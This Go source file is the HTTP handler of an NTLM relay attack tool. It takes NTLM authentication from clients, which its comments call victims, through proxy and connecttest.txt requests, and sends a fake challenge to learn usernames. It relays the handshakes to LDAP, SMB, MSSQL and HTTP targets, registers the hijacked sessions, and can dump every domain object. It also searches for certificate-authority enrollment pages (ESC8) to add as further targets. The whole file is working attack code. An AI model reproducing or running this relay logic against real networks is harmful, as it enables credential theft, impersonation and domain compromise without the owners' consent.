package main

import (
	"bufio"
	"encoding/base64"
	"log"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

type clientState struct {
	targets     []string
	currentUser string // user identity extracted from Type 3
	targetIndex int    // current target being attempted
	token       string // per-user token for tracking progress
	mu          sync.Mutex
}


// global: token -> per-user state
var tokenStates sync.Map

func httpHandler(w http.ResponseWriter, r *http.Request) {
	now := time.Now().Format("15:04:05")
	host, port, _ := net.SplitHostPort(r.RemoteAddr)
	clientKey := host + ":" + port
	
	// check if this is a connecttest.txt request
	isConnectTest := strings.Contains(r.URL.Path, "connecttest.txt") || 
		strings.Contains(r.URL.String(), "connecttest.txt")

	// check if this is a request with the CONNECT method
	isConnectMethod := r.Method == "CONNECT"

	// check if this is proxy authentication
	proxy := isProxyRequest(r)

	// check for an auth header
	authValue := getAuthHeader(r)

	// if there's no ntlm auth header, prompt for it
	if authValue == "" {
		promptAuth(w, r, proxy)
		return
	}

	// log request
	targetInfo := getTargetForLogging(r)
	if proxy {
		log.Printf("%s%s%s [HTTP]%s %s %s %s proxy request to %s with authentication header%s", 
			Grey, now, Reset, Grey, r.RemoteAddr, r.Method, r.Proto, targetInfo, Reset)
	} else {
		log.Printf("%s%s%s [HTTP]%s %s %s %s to %s with authentication header%s", 
			Grey, now, Reset, Grey, r.RemoteAddr, r.Method, r.Proto, targetInfo, Reset)
	}

	var state *clientState
	var foundToken string

	// Special handling for CONNECT method and connecttest.txt - direct relay to first target only
	if isConnectMethod || isConnectTest {
		// Create a simple state with just the first target, no token tracking
		state = &clientState{
			targets:     []string{targets[0]},
			currentUser: "",
			targetIndex: 0,
			token:       "", // no token for direct relay
		}
		if verbose {
			log.Printf("%s%s%s [HTTP]%s CONNECT method or connecttest.txt request. Immediately relaying to first target%s", Grey, now, Reset, Grey, Reset)
		}
	} else {
		// Standard token-based multi relay for regular requests
		// pull out parameters from query string 
		for param := range r.URL.Query() {
			// check if this is a known token
			if v, ok := tokenStates.Load(param); ok {
				state = v.(*clientState)
				foundToken = param
				
				// strip the token from query string
				q := r.URL.Query()
				q.Del(param)
				r.URL.RawQuery = q.Encode()
				
				// find current target for the token
				if state.targetIndex < len(state.targets) {
					currentTarget := state.targets[state.targetIndex]
					if verbose {
						log.Printf("%s%s%s [HTTP] Found existing token %s (%s). Current target: %s (%d/%d)%s", 
							Grey, now, Reset, foundToken, state.currentUser, currentTarget, state.targetIndex+1, len(state.targets), Reset)
					}
				} else if verbose {
					log.Printf("%s%s%s [HTTP] Found existing token %s (%s). All targets completed%s", 
						Grey, now, Reset, foundToken, state.currentUser, Reset)
				}
				break
			}
		}

		// no valid token create temporary state for user enumeration using multi relay redirect
		if state == nil {
			state = &clientState{
				targets:     append([]string{}, targets...),
				currentUser: "",
				targetIndex: 0,
			}
			if debug {
				log.Printf("%s%s%s [HTTP]%s No token found, created temporary state for enumeration%s", Grey, now, Reset, Grey, Reset)
			}
		}
	}

	state.mu.Lock()
	defer state.mu.Unlock()

	// determine what ntlm type this is (1 or 3)
	ntlmType, ntlmAuth := validateAuthHeader(authValue)

	// user enum section - only for regular requests with no token
	// Skip this entirely for CONNECT/connecttest requests
	if state.token == "" && !isConnectMethod && !isConnectTest {

		// ntlm negotiate
		if ntlmType == 1 {
			fakeType2 := sendFakeType2()
			if verbose {
				log.Printf("%s%s%s [HTTP]%s Received unknown NTLM type 1 from %s. Sending fake type 2 to enumerate user%s", Grey, now, Reset, Yellow, r.RemoteAddr, Reset)
			}

			// return the challenge, an authentication header, and a 407 or 401 
			if proxy {
				w.Header().Set("Proxy-Authenticate", fakeType2)
				w.WriteHeader(http.StatusProxyAuthRequired)
			} else {
				w.Header().Set("WWW-Authenticate", fakeType2)
				w.WriteHeader(http.StatusUnauthorized)
			}
			return
		}

		// ntlm authenticate
		if ntlmType == 3 {
			// extract user from the resulting type 3
			domain, user, workstation, err := parseNTLMv2AuthIdentity(ntlmAuth)
			if err != nil {
				if verbose {
					log.Printf("%s%s%s [HTTP]%s failed to parse NTLM type 3: %v%s", Grey, now, Reset, Red, err, Reset)
				}
				w.WriteHeader(http.StatusBadRequest)
				return
			}

			// set the current user
			if user != "" {
				state.currentUser = strings.ToUpper(domain) + `\` + user
			}

			// use parameter based token redirect
			loc, tok := buildRedirectLocation(state, r)
			w.Header().Set("Location", loc)

			if verbose {
				if proxy {
					log.Printf("%s%s%s [HTTP]%s Received type 3 over proxy request from %s on %s (%s). Sending redirect with token %s%s", 
						Grey, now, Reset, Yellow, state.currentUser, workstation, r.RemoteAddr, tok, Reset)
				} else {
					log.Printf("%s%s%s [HTTP]%s Received type 3 from %s on %s (%s). Sending redirect with token %s%s", 
						Grey, now, Reset, Yellow, state.currentUser, workstation, r.RemoteAddr, tok, Reset)
				}
			}
			w.WriteHeader(http.StatusTemporaryRedirect)
			return
		}
	}

	// from here on, we relay to the current target
	// check if we've exhausted all targets and end relay if so
	if state.targetIndex >= len(state.targets) {
		userPrefix := ""
		if state.currentUser != "" {
			userPrefix = state.currentUser + " - "
		}
		if verbose {
			log.Printf("%s%s%s [HTTP]%s %sCompleted all targets%s", Grey, now, Reset, Yellow, userPrefix, Reset)
		}
		endRelay(w)
		return
	}

	currentTarget := state.targets[state.targetIndex]
	u, err := url.Parse(currentTarget)
	if err != nil {
		log.Printf("%s%s%s [HTTP]%s failed to parse target: %v%s", Grey, now, Reset, Red, err, Reset)
		http.Error(w, "bad target", http.StatusInternalServerError)
		return
	}

	// check if exists for this user on this target, skip if so
	// Skip this check for direct relay mode
	if state.currentUser != "" && ntlmType == 1 && !isConnectMethod && !isConnectTest {
		hostOnly, portStr, _ := net.SplitHostPort(u.Host)
		if hostOnly == "" {
			hostOnly = u.Host
		}
		p := 389
		if u.Scheme == "ldaps" {
			p = 636
		} else if u.Scheme == "http" {
			p = 80
		} else if u.Scheme == "https" {
			p = 443
		} else if u.Scheme == "smb" {
			p = 445
		} else if u.Scheme == "mssql" {
			p = 1433
		}
		if pp, err := strconv.Atoi(portStr); err == nil {
			p = pp
		}

		if sess := pickUserSession(state.currentUser, hostOnly, p); sess != nil {
			log.Printf("%s%s%s [SESSION]%s %s - session already exists for %s:%d, moving to next target%s", Grey, now, Reset, Yellow, state.currentUser, hostOnly, p, Reset)
			state.targetIndex++
			if state.targetIndex >= len(state.targets) {
				endRelay(w)
				return
			}
			// send redirect to trigger re-auth for next target, with per-user token in URL. this allows us to work through the relay list, even if the first target is already completed
			loc, _ := buildRedirectLocation(state, r)
			w.Header().Set("Location", loc)
			w.WriteHeader(http.StatusTemporaryRedirect)
			return
		}
	}

	userPrefix := ""
	if state.currentUser != "" {
		userPrefix = state.currentUser + " - "
	}

	// SMB targets manage their own upstream connection (not HTTP-based)
	if u.Scheme == "smb" {
		stateKey := clientKey + "|" + currentTarget

		if ntlmType == 1 {
			if verbose {
				log.Printf("%s%s%s [SMB]%s %sForwarding NTLM type 1 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, r.RemoteAddr, currentTarget, Reset)
			}
			serverCreds, _, _, err := httpRelayToSMB(stateKey, currentTarget, ntlmType, ntlmAuth)
			if err != nil {
				log.Printf("%s%s%s [SMB]%s %sRelay type 1 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				state.targetIndex++
				if state.targetIndex >= len(state.targets) {
					endRelay(w)
					return
				}
				loc, _ := buildRedirectLocation(state, r)
				w.Header().Set("Location", loc)
				w.WriteHeader(http.StatusTemporaryRedirect)
				return
			}
			ch := "NTLM " + base64.StdEncoding.EncodeToString(serverCreds)
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sReturning NTLM type 2 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, currentTarget, r.RemoteAddr, Reset)
			}
			if proxy {
				w.Header().Set("Proxy-Authenticate", ch)
				w.WriteHeader(http.StatusProxyAuthRequired)
			} else {
				w.Header().Set("WWW-Authenticate", ch)
				w.WriteHeader(http.StatusUnauthorized)
			}
			return
		}

		if ntlmType == 3 {
			domain, user, workstation, _ := parseNTLMv2AuthIdentity(ntlmAuth)
			if state.currentUser == "" && user != "" {
				state.currentUser = strings.ToUpper(domain) + `\` + user
				userPrefix = state.currentUser + " - "
			}
			if verbose {
				log.Printf("%s%s%s [SMB]%s %sForwarding NTLM type 3 from %s (%s) to %s%s", Grey, now, Reset, Yellow, userPrefix, workstation, r.RemoteAddr, currentTarget, Reset)
			}
			_, ok, _, err := httpRelayToSMB(stateKey, currentTarget, ntlmType, ntlmAuth)
			if err != nil {
				log.Printf("%s%s%s [SMB]%s %sRelay type 3 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				w.WriteHeader(http.StatusBadGateway)
				return
			}
			if !ok {
				log.Printf("%s%s%s [SMB]%s %sAuthentication failed to %s%s", Grey, now, Reset, Red, userPrefix, currentTarget, Reset)
				w.WriteHeader(http.StatusUnauthorized)
				return
			}

			log.Printf("%s%s%s [SMB]%s %sAuthenticated to %s%s", Grey, now, Reset, Green, userPrefix, currentTarget, Reset)

			if isConnectMethod || isConnectTest {
				w.WriteHeader(http.StatusOK)
				return
			}
			state.targetIndex++
			if state.targetIndex >= len(state.targets) {
				if verbose {
					log.Printf("%s%s%s [HTTP]%s %sCompleted all targets%s", Grey, now, Reset, Reset, userPrefix, Reset)
				}
				endRelay(w)
				return
			}
			loc, tok := buildRedirectLocation(state, r)
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sSending redirect with token %s%s", Grey, now, Reset, Yellow, userPrefix, tok, Reset)
			}
			w.Header().Set("Location", loc)
			w.WriteHeader(http.StatusTemporaryRedirect)
			return
		}

		// Unknown NTLM type for SMB target
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// MSSQL targets manage their own upstream connection (TDS protocol)
	if u.Scheme == "mssql" {
		stateKey := clientKey + "|" + currentTarget

		if ntlmType == 1 {
			if verbose {
				log.Printf("%s%s%s [MSSQL]%s %sForwarding NTLM type 1 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, r.RemoteAddr, currentTarget, Reset)
			}
			serverCreds, _, _, err := httpRelayToMSSQL(stateKey, currentTarget, ntlmType, ntlmAuth)
			if err != nil {
				log.Printf("%s%s%s [MSSQL]%s %sRelay type 1 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				state.targetIndex++
				if state.targetIndex >= len(state.targets) {
					endRelay(w)
					return
				}
				loc, _ := buildRedirectLocation(state, r)
				w.Header().Set("Location", loc)
				w.WriteHeader(http.StatusTemporaryRedirect)
				return
			}
			ch := "NTLM " + base64.StdEncoding.EncodeToString(serverCreds)
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sReturning NTLM type 2 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, currentTarget, r.RemoteAddr, Reset)
			}
			if proxy {
				w.Header().Set("Proxy-Authenticate", ch)
				w.WriteHeader(http.StatusProxyAuthRequired)
			} else {
				w.Header().Set("WWW-Authenticate", ch)
				w.WriteHeader(http.StatusUnauthorized)
			}
			return
		}

		if ntlmType == 3 {
			domain, user, workstation, _ := parseNTLMv2AuthIdentity(ntlmAuth)
			if state.currentUser == "" && user != "" {
				state.currentUser = strings.ToUpper(domain) + `\` + user
				userPrefix = state.currentUser + " - "
			}
			if verbose {
				log.Printf("%s%s%s [MSSQL]%s %sForwarding NTLM type 3 from %s (%s) to %s%s", Grey, now, Reset, Yellow, userPrefix, workstation, r.RemoteAddr, currentTarget, Reset)
			}
			_, ok, _, err := httpRelayToMSSQL(stateKey, currentTarget, ntlmType, ntlmAuth)
			if err != nil {
				log.Printf("%s%s%s [MSSQL]%s %sRelay type 3 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				w.WriteHeader(http.StatusBadGateway)
				return
			}
			if !ok {
				log.Printf("%s%s%s [MSSQL]%s %sAuthentication failed to %s%s", Grey, now, Reset, Red, userPrefix, currentTarget, Reset)
				w.WriteHeader(http.StatusUnauthorized)
				return
			}

			log.Printf("%s%s%s [MSSQL]%s %sAuthenticated to %s%s", Grey, now, Reset, Green, userPrefix, currentTarget, Reset)

			if isConnectMethod || isConnectTest {
				w.WriteHeader(http.StatusOK)
				return
			}
			state.targetIndex++
			if state.targetIndex >= len(state.targets) {
				if verbose {
					log.Printf("%s%s%s [HTTP]%s %sCompleted all targets%s", Grey, now, Reset, Reset, userPrefix, Reset)
				}
				endRelay(w)
				return
			}
			loc, tok := buildRedirectLocation(state, r)
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sSending redirect with token %s%s", Grey, now, Reset, Yellow, userPrefix, tok, Reset)
			}
			w.Header().Set("Location", loc)
			w.WriteHeader(http.StatusTemporaryRedirect)
			return
		}

		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// get or create connection to target (HTTP/LDAP)
	if debug { log.Printf("%s%s%s [HTTP]%s %sOpening connection to %s%s", Grey, now, Reset, Reset, userPrefix, u.Host, Reset) }

	up, err := getOrCreateUpstream(clientKey + "|" + u.String(), u)

	if err != nil {
		log.Printf("%s%s%s [HTTP]%s %supstream dial failed to %s: %v%s", Grey, now, Reset, Red, userPrefix, currentTarget, err, Reset)
		http.Error(w, "upstream dial failed", http.StatusBadGateway)
		return
	}
	if debug {
		log.Printf("%s%s%s [HTTP]%s %susing upstream connection to %s%s", Grey, now, Reset, Grey, userPrefix, u.Host, Reset)
	}
	bw := bufio.NewWriter(up.conn)

	// handle ntlm type 1 negotiate, real relay phase below
	if ntlmType == 1 {

		// to ldap handler
		if u.Scheme == "ldap" || u.Scheme == "ldaps" {
			if verbose {
				log.Printf("%s%s%s [LDAP]%s %sForwarding NTLM type 1 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, r.RemoteAddr, currentTarget, Reset)
			}

			// send type 1, receive type 2
			serverCreds, _, _, err := relayToLDAP(up, ntlmType, ntlmAuth)
			if err != nil {
				log.Printf("%s%s%s [LDAP]%s %srelay type1 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				w.WriteHeader(http.StatusBadGateway)
				return
			}

			// check type 2 
			ch := ""
			if len(serverCreds) > 0 {
				ch = "NTLM " + base64.StdEncoding.EncodeToString(serverCreds)
			}

			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sReturning NTLM type 2 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, currentTarget, r.RemoteAddr, Reset)
			}

			// return the type 2 to the victim
			if proxy {
				w.Header().Set("Proxy-Authenticate", ch)
				w.WriteHeader(http.StatusProxyAuthRequired)
			} else {
				w.Header().Set("WWW-Authenticate", ch)
				w.WriteHeader(http.StatusUnauthorized)
			}
			if debug {
				dumpMyHTTPResponse(http.StatusUnauthorized, w.Header())
			}
			return

		// to http handler
		} else if u.Scheme == "http" || u.Scheme == "https" {
			// probe target for NTLM support
			if ok, err := probeNTLMAuth(currentTarget); ok {
				
				// build auth header and send type 1 to target
				if verbose { 
					log.Printf("%s%s%s [HTTP]%s %sForwarding NTLM type 1 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, r.RemoteAddr, currentTarget, Reset) 
				}
				
				authHeader := "NTLM " + base64.StdEncoding.EncodeToString(ntlmAuth)
				if err := writeRawGET(bw, up.path, up.host, authHeader); err != nil {
					log.Printf("%s%s%s [HTTP]%s %swrite upstream failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
					http.Error(w, "write upstream failed", http.StatusBadGateway)
					return
				}

				// read the response
				resp, err := readHTTPResponse(up.br)
				if err != nil {
					log.Printf("%s%s%s [HTTP]%s %sread upstream failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
					http.Error(w, "read upstream failed", http.StatusBadGateway)
					return
				}
				_ = drainBody(resp)

				// check for type 2 in response
				ch := resp.Header.Get("WWW-Authenticate")
				if ch == "" {
					log.Printf("%s%s%s [HTTP]%s %sno WWW-Authenticate header in response%s", Grey, now, Reset, Yellow, userPrefix, Reset)
					w.WriteHeader(resp.StatusCode)
					return
				}

				if verbose {
					log.Printf("%s%s%s [HTTP]%s %sReturning NTLM type 2 from %s to %s%s", Grey, now, Reset, Yellow, userPrefix, currentTarget, r.RemoteAddr, Reset)
				}

				// return type 2 to victim
				if proxy {
					w.Header().Set("Proxy-Authenticate", ch)
					w.WriteHeader(http.StatusProxyAuthRequired)
				} else {
					w.Header().Set("WWW-Authenticate", ch)
					w.WriteHeader(http.StatusUnauthorized)
				}
				if debug {
					dumpMyHTTPResponse(http.StatusUnauthorized, w.Header())
				}

				// ???
				if strings.EqualFold(resp.Header.Get("Connection"), "close") {
					key := clientKey + "|" + u.String()

					upstreamMutex.Lock()
					delete(upstreamByClient, key)
					upstreamMutex.Unlock()

					if verbose {
						log.Printf("%s%s%s [HTTP]%s %supstream requested connection close, cleaned up%s", Grey, now, Reset, Grey, userPrefix, Reset)
					}
				}
				return
			} else {
				// target doesn't support ntlm
				// For direct relay mode, just fail
				if isConnectMethod || isConnectTest {
					log.Printf("%s%s%s [HTTP]%s %starget %s doesn't support NTLM: %v%s", Grey, now, Reset, Red, userPrefix, currentTarget, err, Reset)
					w.WriteHeader(http.StatusBadGateway)
					return
				}
				// For multi-relay, move on to next target
				log.Printf("%s%s%s [HTTP]%s %starget %s doesn't support NTLM: %v%s", Grey, now, Reset, Red, userPrefix, currentTarget, err, Reset)
				state.targetIndex++
				if state.targetIndex >= len(state.targets) {
					endRelay(w)
					return
				}
				// send 302 to trigger re-auth for next target, with per-user token
				loc, _:= buildRedirectLocation(state, r)
				w.Header().Set("Location", loc)
				w.WriteHeader(http.StatusTemporaryRedirect)
				return
			}
		}
	}

	// handle ntlm type 3 authenticate - real relay section
	if ntlmType == 3 {
		// extract user identity from type 3
		domain, user, workstation, err := parseNTLMv2AuthIdentity(ntlmAuth)
		if err != nil {
			if verbose {
				log.Printf("%s%s%s [HTTP]%s failed to parse NTLM type 3: %v%s", Grey, now, Reset, Red, err, Reset)
			}
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		// set currentUser if not already set (happens in direct relay mode)
		if state.currentUser == "" && user != "" {
			state.currentUser = strings.ToUpper(domain) + `\` + user
		}

		// Update userPrefix now that we have the username
		userPrefix = ""
		if state.currentUser != "" {
			userPrefix = state.currentUser + " - "
		}

		// For direct relay mode (CONNECT/connecttest), check if session already exists
		if (isConnectMethod || isConnectTest) && state.currentUser != "" {
			hostOnly, portStr, _ := net.SplitHostPort(u.Host)
			if hostOnly == "" {
				hostOnly = u.Host
			}
			p := 389
			if u.Scheme == "ldaps" {
				p = 636
			} else if u.Scheme == "http" {
				p = 80
			} else if u.Scheme == "https" {
				p = 443
			} else if u.Scheme == "smb" {
				p = 445
			} else if u.Scheme == "mssql" {
				p = 1433
			}
			if pp, err := strconv.Atoi(portStr); err == nil {
				p = pp
			}

			if sess := pickUserSession(state.currentUser, hostOnly, p); sess != nil {

				if isConnectTest {
					if verbose {
						log.Printf("%s%s%s [SESSION]%s %ssession already exists for %s:%d, returning 200 for msftconnecttest.com%s", 
							Grey, now, Reset, Yellow, userPrefix, hostOnly, p, Reset)
					}
					//w.WriteHeader(http.StatusBadGateway)

					w.Header().Set("Content-Type", "text/plain")
					w.Header().Set("Connection", "close")
					w.WriteHeader(http.StatusOK)
					w.Write([]byte("Microsoft Connect Test"))
				} else {
					if verbose {
						log.Printf("%s%s%s [SESSION]%s %ssession already exists for %s:%d, returning 200%s", 
							Grey, now, Reset, Yellow, userPrefix, hostOnly, p, Reset)
					}
					w.WriteHeader(http.StatusOK)
				}
				return
			}
		}

		// to ldap handler 
		if u.Scheme == "ldap" || u.Scheme == "ldaps" {
			if verbose {
				log.Printf("%s%s%s [LDAP]%s %sForwarding NTLM type 3 from %s (%s) to %s%s", Grey, now, Reset, Yellow, userPrefix, workstation, r.RemoteAddr, currentTarget, Reset)
			}

			// send type 3, receive response
			serverCreds, ok, dcDnsHostName, err := relayToLDAP(up, ntlmType, ntlmAuth)
			_ = serverCreds

			if err != nil {
				log.Printf("%s%s%s [LDAP]%s %sRelay type3 failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				w.WriteHeader(http.StatusBadGateway)
				return
			}

			// auth failed
			if !ok {
				log.Printf("%s%s%s [LDAP]%s %sAuthentication failed to %s%s", Grey, now, Reset, Red, userPrefix, currentTarget, Reset)
				w.WriteHeader(http.StatusUnauthorized)
				return
			}

			// successful auth
			log.Printf("%s%s%s [LDAP]%s %sAuthenticated to %s (%s)%s", Grey, now, Reset, Green, userPrefix, currentTarget, dcDnsHostName, Reset)

			// post-auth ldap actions here
			// * query on domain
			if dump {
				if verbose {
					log.Printf("%s%s%s [LDAP]%s %sDumping all domain objects%s", Grey, now, Reset, Yellow, userPrefix, Reset)
				}
				queryAllDomainObjects(up, up.baseDN)
			}

			// look for esc8
			if findCA {
				log.Printf("%s%s%s [LDAP]%s %sQuerying DC for certificate authorities%s", Grey, now, Reset, Reset, userPrefix, Reset)
				
				var cas []CA
				
				// Start with CAs discovered from TLS
				casMutex.Lock()
				if len(discoveredCAs) > 0 {
					cas = append(cas, discoveredCAs...)
					if verbose {
						log.Printf("%s%s%s [LDAP]%s %sUsing %d CA(s) discovered from TLS certificate%s", 
							Grey, now, Reset, Yellow, userPrefix, len(discoveredCAs), Reset)
					}
				}
				casMutex.Unlock()
				
				// Query LDAP for additional CAs
				if ldapCAs, err := queryCertificateAuthorities(up, up.configDN); err == nil && len(ldapCAs) > 0 {
					if verbose {
						log.Printf("%s%s%s [LDAP]%s %sFound %d CA(s) from LDAP query%s", 
							Grey, now, Reset, Yellow, userPrefix, len(ldapCAs), Reset)
					}
					
					// Merge LDAP CAs with TLS-discovered CAs (avoid duplicates)
					for _, ldapCA := range ldapCAs {
						found := false
						for i := range cas {
							if cas[i].cn == ldapCA.cn || (cas[i].host != "" && cas[i].host == ldapCA.host) {
								// Update existing entry with LDAP data
								if cas[i].host == "" && ldapCA.host != "" {
									cas[i].host = ldapCA.host
								}
								if cas[i].cn == "" && ldapCA.cn != "" {
									cas[i].cn = ldapCA.cn
								}
								found = true
								break
							}
						}
						if !found {
							cas = append(cas, ldapCA)
						}
					}
				}
				
				if len(cas) > 0 {
				outer:
					for i := range cas {
						if cas[i].host != "" {
							if verbose {
								log.Printf("%s%s%s [LDAP]%s %sQuerying for IP of certificate authority %s%s", 
									Grey, now, Reset, Reset, userPrefix, cas[i].host, Reset)
							}
							cas[i].ip = queryDNSRecord(up, up.baseDN, cas[i].host)
							
							if cas[i].ip != "" {
								for _, scheme := range []string{"http", "https"} {
									url := scheme + "://" + cas[i].ip + "/certsrv/certfnsh.asp"
									if verbose {
										log.Printf("%s%s%s [LDAP]%s %sProbing for NTLM auth on certificate authority %s%s", 
											Grey, now, Reset, Reset, userPrefix, cas[i].host, Reset)
									}
									
									if ok, _ := probeNTLMAuth(url); ok {
										cas[i].targetURL = url
										state.targets = append(state.targets, url)
										if verbose {
											log.Printf("%s%s%s [LDAP]%s %sAdded CA %s to target list%s", 
												Grey, now, Reset, Yellow, userPrefix, url, Reset)
										}
										break outer
									}
								}
							}
						}
					}
					
					// Log all discovered CAs
					for _, ca := range cas {
						if ca.ip != "" {
							log.Printf("%s%s%s [LDAP]%s %sFound certificate authority: %s (%s)%s", 
								Grey, now, Reset, Green, userPrefix, ca.host, ca.ip, Reset)
						} else if ca.host != "" {
							log.Printf("%s%s%s [LDAP]%s %sFound certificate authority: %s%s", 
								Grey, now, Reset, Green, userPrefix, ca.host, Reset)
						} else {
							log.Printf("%s%s%s [LDAP]%s %sFound certificate authority: %s%s", 
								Grey, now, Reset, Green, userPrefix, ca.cn, Reset)
						}
					}
				}
			}

			// register session
			hostOnly, portStr, _ := net.SplitHostPort(up.host)
			if hostOnly == "" {
				hostOnly = up.host
			}
			p := 389
			if u.Scheme == "ldaps" {
				p = 636
			}
			if pp, err := strconv.Atoi(portStr); err == nil {
				p = pp
			}

			pc := &LDAPClient{}
			if _, err := registerSession(strings.ToUpper(u.Scheme), hostOnly, p, state.currentUser, up, pc); err != nil {
				log.Printf("%s%s%s [SOCKS]%s %sRegister session failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				w.WriteHeader(http.StatusBadGateway)
				return
			}

			// clean up upstream connection
			key := clientKey + "|" + u.String()

			upstreamMutex.Lock()
			delete(upstreamByClient, key)
			upstreamMutex.Unlock()

			if debug {
				log.Printf("%s%s%s [LDAP]%s %sCleaned up upstream connection%s", Grey, now, Reset, Grey, userPrefix, Reset)
			}

			// For direct relay mode (CONNECT/connecttest), just return success
			if isConnectMethod || isConnectTest {
				w.WriteHeader(http.StatusOK)
				return
			}

			// For multi-relay mode, move to next target
			state.targetIndex++
			if state.targetIndex >= len(state.targets) {
				if verbose {
					log.Printf("%s%s%s [HTTP]%s %sCompleted all targets%s", Grey, now, Reset, Reset, userPrefix, Reset)
				}
				endRelay(w)
				return
			}

			// send 302 to trigger auth for next target, with per-user token
			loc, tok := buildRedirectLocation(state, r)
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sSending redirect with token %s%s", Grey, now, Reset, Yellow, userPrefix, tok, Reset)
			}
			w.Header().Set("Location", loc)
			w.WriteHeader(http.StatusTemporaryRedirect)
			return

		// to http handler
		} else if u.Scheme == "http" || u.Scheme == "https" {
			if verbose {
				log.Printf("%s%s%s [HTTP]%s %sForwarding NTLM type 3 from %s (%s) to %s%s", Grey, now, Reset, Yellow, userPrefix, workstation, r.RemoteAddr, currentTarget, Reset)
			}

			// send type 3
			if err := writeRawGET(bw, up.path, up.host, "NTLM "+base64.StdEncoding.EncodeToString(ntlmAuth)); err != nil {
				log.Printf("%s%s%s [HTTP]%s %sWrite upstream failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				http.Error(w, "write upstream failed", http.StatusBadGateway)
				return
			}

			// receive response
			resp, err := readHTTPResponse(up.br)
			if err != nil {
				log.Printf("%s%s%s [HTTP]%s %sRead upstream failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
				http.Error(w, "read upstream failed", http.StatusBadGateway)
				return
			}
			_ = drainBody(resp)

			// successful authentication
			if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				log.Printf("%s%s%s [HTTP]%s %sAuthenticated to %s%s", Grey, now, Reset, Green, userPrefix, currentTarget, Reset)

				// register session
				hostOnly, portStr, _ := net.SplitHostPort(up.host)
				if hostOnly == "" {
					hostOnly = up.host
				}
				p := 80
				if u.Scheme == "https" {
					p = 443
				}
				if pp, err := strconv.Atoi(portStr); err == nil {
					p = pp
				}

				pc := &HTTPClient{}
				if _, err := registerSession(strings.ToUpper(u.Scheme), hostOnly, p, state.currentUser, up, pc); err != nil {
					log.Printf("%s%s%s [SOCKS]%s %sRegister session failed: %v%s", Grey, now, Reset, Red, userPrefix, err, Reset)
					w.WriteHeader(http.StatusBadGateway)
					return
				}

				// clean up upstream connection
				key := clientKey + "|" + u.String()

				upstreamMutex.Lock()
				delete(upstreamByClient, key)
				upstreamMutex.Unlock()

				if debug {
					log.Printf("%s%s%s [HTTP]%s %sCleaned up upstream connection%s", Grey, now, Reset, Grey, userPrefix, Reset)
				}

				// For direct relay mode (CONNECT/connecttest), just return success
				if isConnectMethod || isConnectTest {
					w.WriteHeader(http.StatusOK)
					return
				}

				// For multi-relay mode, move to next target
				state.targetIndex++
				if state.targetIndex >= len(state.targets) {
					if verbose {
						log.Printf("%s%s%s [HTTP]%s %sCompleted all targets%s", Grey, now, Reset, Reset, userPrefix, Reset)
					}
					endRelay(w)
					return
				}

				// send 302 to trigger reauth for next target, with per-user token
				loc, tok := buildRedirectLocation(state, r)
				if verbose {
					log.Printf("%s%s%s [HTTP]%s %sSending redirect with token %s%s", Grey, now, Reset, Yellow, userPrefix, tok, Reset)
				}
				w.Header().Set("Location", loc)
				w.WriteHeader(http.StatusTemporaryRedirect)
				return
			}

			// auth failed
			log.Printf("%s%s%s [HTTP]%s %sRelay failed to %s (status %d)%s", Grey, now, Reset, Red, userPrefix, currentTarget, resp.StatusCode, Reset)
			w.WriteHeader(resp.StatusCode)
			return
		}
	}
}